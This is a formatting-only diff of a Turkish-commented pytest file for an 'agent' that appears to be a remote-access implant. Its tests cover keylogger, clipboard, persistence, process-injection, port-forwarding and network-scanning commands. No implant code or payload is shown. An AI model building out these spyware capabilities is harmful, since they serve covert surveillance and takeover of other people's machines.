@@ -14,15 +14,16 @@ Agent'ın tüm komut işleme yeteneklerini test eder:
 Çalıştırma:
     pytest tests/chimera/test_commands.py -v
 """
-import pytest
-import sys
-import base64
-from unittest.mock import MagicMock, patch
 
+import base64
+import sys
+
+import pytest
 
 # ============================================================
 # Temel Komut Çalıştırma
 # ============================================================
+
 
 class TestBasicCommands:
     """Temel sistem komutu çalıştırma testleri."""
@@ -57,6 +58,7 @@ class TestBasicCommands:
 # Özel Komutlar
 # ============================================================
 
+
 class TestSpecialCommands:
     """Agent'ın tanıdığı özel komut testleri."""
 
@@ -69,7 +71,9 @@ class TestSpecialCommands:
     def test_sysinfo_returns_system_info(self, agent):
         """sysinfo komutu sistem bilgilerini döner."""
         result = agent.execute_command("sysinfo")
-        assert "SİSTEM BİLGİSİ" in result or "OS:" in result or "İşletim Sistemi" in result
+        assert (
+            "SİSTEM BİLGİSİ" in result or "OS:" in result or "İşletim Sistemi" in result
+        )
 
     def test_sysinfo_contains_hostname(self, agent):
         """sysinfo çıktısı hostname içerir."""
@@ -96,10 +100,13 @@ class TestSpecialCommands:
 # Keylogger Komutları
 # ============================================================
 
+
 class TestKeyloggerCommands:
     """Keylogger ile ilgili komut testleri."""
 
-    @pytest.mark.skipif(sys.platform != "win32", reason="Keylogger sadece Windows'ta desteklenir")
+    @pytest.mark.skipif(
+        sys.platform != "win32", reason="Keylogger sadece Windows'ta desteklenir"
+    )
     def test_keylogger_start_on_windows(self, agent):
         """Windows'ta keylogger başlatılabilir."""
         result = agent.execute_command("keylogger_start")
@@ -126,6 +133,7 @@ class TestKeyloggerCommands:
 # ============================================================
 # Clipboard Komutları
 # ============================================================
+
 
 class TestClipboardCommands:
     """Clipboard ile ilgili komut testleri."""
@@ -154,6 +162,7 @@ class TestClipboardCommands:
 # Persistence Komutları
 # ============================================================
 
+
 class TestPersistenceCommands:
     """Kalıcılık komutlarının test edilmesi."""
 
@@ -172,10 +181,13 @@ class TestPersistenceCommands:
 # Process Injection Komutları
 # ============================================================
 
+
 class TestInjectionCommands:
     """Process injection komut testleri."""
 
-    @pytest.mark.skipif(sys.platform != "win32", reason="Process injection sadece Windows'ta")
+    @pytest.mark.skipif(
+        sys.platform != "win32", reason="Process injection sadece Windows'ta"
+    )
     def test_inject_list(self, agent):
         """inject_list komutu process listesi döner."""
         result = agent.execute_command("inject_list")
@@ -197,6 +209,7 @@ class TestInjectionCommands:
 # Port Forwarding Komutları
 # ============================================================
 
+
 class TestPortForwardingCommands:
     """Port forwarding komut testleri."""
 
@@ -215,6 +228,7 @@ class TestPortForwardingCommands:
 # Network Scanner Komutları
 # ============================================================
 
+
 class TestNetworkScannerCommands:
     """Ağ tarama komut testleri."""
 
@@ -228,6 +242,7 @@ class TestNetworkScannerCommands:
 # Command Komut Case-Insensitivity
 # ============================================================
 
+
 class TestCommandCaseInsensitivity:
     """Komutların büyük/küçük harf duyarsız olduğu testler."""
 
@@ -238,7 +253,6 @@ class TestCommandCaseInsensitivity:
 
     def test_sysinfo_mixed_case(self, agent):
         """SYSINFO büyük harf ile çalışır."""
-        agent2_running = agent.running
         result = agent.execute_command("SYSINFO")
         # Büyük harfle çalışıyor mu yoksa sistem komutu olarak mı gidiyor kontrolü
         # Agent cmd_lower kullanıyor bu yüzden case insensitive olmalı
